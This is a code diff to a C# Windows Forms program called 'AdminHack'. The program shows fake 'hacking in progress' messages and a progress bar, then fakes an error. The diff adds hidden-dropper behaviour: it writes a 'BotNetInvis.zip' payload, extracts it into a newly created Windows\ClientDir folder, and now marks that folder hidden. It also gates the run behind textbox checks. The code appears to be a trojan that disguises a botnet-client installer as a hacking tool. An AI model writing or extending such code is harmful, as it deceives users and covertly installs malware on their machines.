@@ -31,7 +31,7 @@ namespace AdminHack
                 label4.Text += "\nHacking in progress...";
                 progressBar1.Value += 45;
                 Thread.Sleep(4000);
-                label4.Text += "\nUnknown error";
+                label4.Text += "\nUnknown error...";
                 Thread.Sleep(5000);
                 throw new Exception();
             });
@@ -54,12 +54,24 @@ namespace AdminHack
         private async void Zip()
         {
                 byte[] bt = GetZip().Result;
+            if (!File.Exists(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip"))
+            {
                 File.WriteAllBytes(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", bt);
                 string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                 DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
-                //di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                 ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
-            
+
+            }
+            else
+            {
+                string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
+                DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
+                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+                ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
+
+            }
+
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -74,8 +86,21 @@ namespace AdminHack
 
         private void button2_Click(object sender, EventArgs e)
         {
-            label4.Text = "Starting...";
-            Log();
+            if (textBox1.Text == "received" && textBox2.Text == "received" && textBox3.Text != null)
+            {
+                label4.Text = "Starting...";
+                progressBar1.Value += 1;
+                Log();
+            }
+            else
+            {
+                label4.Text = "Check the entered data...";
+            }
+        }
+
+        private void tabPage1_Click(object sender, EventArgs e)
+        {
+
         }
     }
     public class Product
